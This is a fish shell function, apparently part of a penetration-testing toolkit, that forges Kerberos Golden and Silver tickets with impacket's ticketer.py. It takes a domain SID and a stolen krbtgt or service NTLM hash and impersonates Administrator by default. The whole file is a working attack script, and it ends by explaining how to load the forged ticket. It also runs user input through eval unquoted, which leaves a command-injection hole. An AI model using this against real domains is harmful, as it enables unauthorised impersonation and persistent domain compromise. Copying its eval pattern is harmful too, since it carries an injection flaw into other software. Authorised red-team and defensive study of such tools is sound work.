# description: Create Golden and Silver Tickets using ticketer.py
function _kronos_ticket --description "Create Golden and Silver Tickets using ticketer.py"
    argparse h/help u/user= d/domain= S/sid= H/hash= s/spn= -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos ticket [OPTIONS]"
        echo ""
        echo "Create Golden or Silver tickets using impacket's ticketer.py."
        echo ""
        echo "Options:"
        echo "  -u, --user USER     User to create the ticket for (default: Administrator)"
        echo "  -d, --domain DOMAIN Target domain (falls back to \$TGT_AD_DOMAIN)"
        echo "  -S, --sid SID       Domain SID"
        echo "  -H, --hash HASH     krbtgt NTLM hash (Golden) or service NTLM hash (Silver)"
        echo "  -s, --spn SPN       Target SPN (for Silver Ticket, e.g., cifs/dc.domain.com)"
        echo "  -h, --help          Show this help message"
        return 0
    end

    set -l domain ""
    if set -q _flag_domain
        set domain $_flag_domain
    else if test -n "$TGT_AD_DOMAIN"
        set domain $TGT_AD_DOMAIN
    else
        echo "Error: Domain is required (-d/--domain)." >&2
        return 1
    end

    if not set -q _flag_sid
        echo "Error: Domain SID is required (-S/--sid)." >&2
        return 1
    end

    if not set -q _flag_hash
        echo "Error: Target hash is required (-H/--hash)." >&2
        return 1
    end

    set -l target_user "Administrator"
    if set -q _flag_user
        set target_user $_flag_user
    end

    set -l impacket_cmd ""
    if command -s ticketer.py >/dev/null
        set impacket_cmd "ticketer.py"
    else if command -s impacket-ticketer >/dev/null
        set impacket_cmd "impacket-ticketer"
    else
        echo "Error: ticketer.py or impacket-ticketer not found in PATH." >&2
        return 1
    end

    set -l cmd_str "$impacket_cmd -nthash $_flag_hash -domain-sid $_flag_sid -domain $domain"

    if set -q _flag_spn
        set cmd_str "$cmd_str -spn $_flag_spn"
        echo "Forging Silver Ticket for $target_user (SPN: $_flag_spn)..."
    else
        echo "Forging Golden Ticket for $target_user..."
    end

    set cmd_str "$cmd_str $target_user"

    eval $cmd_str
    
    if test -f "$target_user.ccache"
        echo "Ticket successfully saved to $target_user.ccache"
        echo "Use 'export KRB5CCNAME=$PWD/$target_user.ccache' to use it."
    end
end
